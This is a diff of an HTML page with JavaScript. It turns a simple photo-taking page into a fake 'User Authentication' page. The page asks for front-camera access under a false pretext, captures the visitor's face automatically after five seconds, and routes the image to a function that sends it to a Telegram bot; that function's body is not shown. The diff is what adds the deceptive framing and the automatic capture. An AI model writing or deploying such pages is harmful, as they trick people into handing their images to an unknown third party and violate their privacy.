@@ -3,26 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Front Camera Photo</title>
+    <title>User Authentication via Camera</title>
 </head>
 <body>
-    <h1>Take a Photo</h1>
-    <video id="video" width="320" height="240" autoplay></video>
-    <button id="snap">Capture Photo</button>
+    <h1>User Authentication</h1>
+    <p>We need to capture a photo for authentication purposes. Please grant camera access to proceed.</p>
+    <button id="start">Start Authentication</button>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-    <script>
-        // Access user's front camera
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                console.error("Error accessing the camera: " + err);
-            });
 
-        // Capture photo
-        document.getElementById("snap").addEventListener("click", () => {
+    <script>
+        let stream;
+
+        // Start authentication process
+        document.getElementById("start").addEventListener("click", () => {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(s => {
+                    stream = s;
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.style.display = 'block';  // Show video feed
+                    setTimeout(capturePhoto, 5000); // Automatically capture after 5 seconds
+                })
+                .catch(err => {
+                    alert("Error accessing the camera: " + err);
+                });
+        });
+
+        // Capture photo automatically after delay
+        function capturePhoto() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
             const context = canvas.getContext('2d');
@@ -30,10 +39,13 @@
 
             // Convert to data URL
             const dataURL = canvas.toDataURL('image/png');
+            
+            // Stop the video stream
+            stream.getTracks().forEach(track => track.stop());
 
-            // Send the image to the Telegram bot
+            // Send the image to the Telegram bot or server
             sendPhotoToTelegramBot(dataURL);
-        });
+        }
 
         // Function to send photo to Telegram bot
         function sendPhotoToTelegramBot(photoData) {
